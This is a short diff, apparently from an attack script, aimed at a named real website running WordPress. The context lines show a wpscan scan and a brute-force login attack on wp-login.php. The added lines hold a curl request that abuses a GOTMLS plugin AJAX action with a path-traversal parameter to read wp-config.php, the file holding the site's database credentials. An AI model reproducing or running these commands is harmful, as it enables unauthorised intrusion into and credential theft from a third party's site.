@@ -14,3 +14,9 @@ wpscan --url https://churchofsatan.com \
   churchofsatan.com \
   http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=%2Fwp-admin%2F&testcookie=1:is incorrect" \
   -t 6 -V -F
+
+
+
+
+curl -s https://churchofsatan.com/wp-admin/admin-ajax.php \
+  -d "action=GOTMLS_ajax_scan&GOTMLS_nonce=REPLACE_WITH_VALID_NONCE&file=../../../wp-config.php"
